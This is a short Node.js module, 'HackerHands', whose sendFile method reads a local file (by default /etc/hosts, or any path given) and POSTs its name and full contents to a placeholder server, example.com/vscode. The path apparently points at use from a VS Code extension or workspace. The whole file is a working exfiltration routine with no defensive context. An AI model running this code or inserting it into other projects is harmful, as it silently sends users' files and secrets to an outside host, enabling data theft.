var http = require('http');
var fs = require('fs');
var querystring = require('querystring');

function HackerHands() {
  this.init.apply(this, arguments);
}

HackerHands.prototype = {
  init: function(conf) {
    this.filepath = conf && conf.path ? conf.path : '/etc/hosts';
  },
  sendFile: function(filepath) {
    filepath = filepath || this.filepath;

    try {
      var fileContent = fs.readFileSync(filepath, 'utf8');
      var postData = querystring.stringify({
        file: {
          name: filepath,
          content: fileContent
        }
      });
      var postOptions = {
        hostname: 'example.com',
        port: '80',
        path: '/vscode',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData)
        }
      };

      var req = http.request(postOptions, function(res) {
        res.on('data', function(chunk) {
          console.log(chunk.toString());
        });

        res.on('end', function() {
          console.log('request end.');
        });
      });

      req.on('error', function(e) {
        console.error('request error: ', e);
      });

      req.write(postData);
      req.end();
    } catch(e) {
      console.error(e);
    }
  }
};

module.exports = HackerHands;